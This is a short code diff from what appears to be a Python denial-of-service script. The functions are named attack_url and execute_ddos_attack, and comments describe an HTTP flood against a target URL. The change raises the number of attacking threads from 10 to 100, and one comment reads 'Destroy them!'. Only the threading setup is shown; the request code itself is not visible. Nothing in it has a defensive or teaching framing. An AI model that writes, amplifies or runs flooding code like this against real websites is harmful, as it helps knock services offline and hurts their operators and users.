@@ -44,7 +44,7 @@ def attack_url():
 # Sets up and executes the HTTP flood against the URL
 def execute_ddos_attack():
     # Use threading to speed up the number of posts made
-    threads = [Thread(target=attack_url, daemon=True) for _ in range(10)]
+    threads = [Thread(target=attack_url, daemon=True) for _ in range(100)]
     
     # Destroy them!
     for thread in threads:
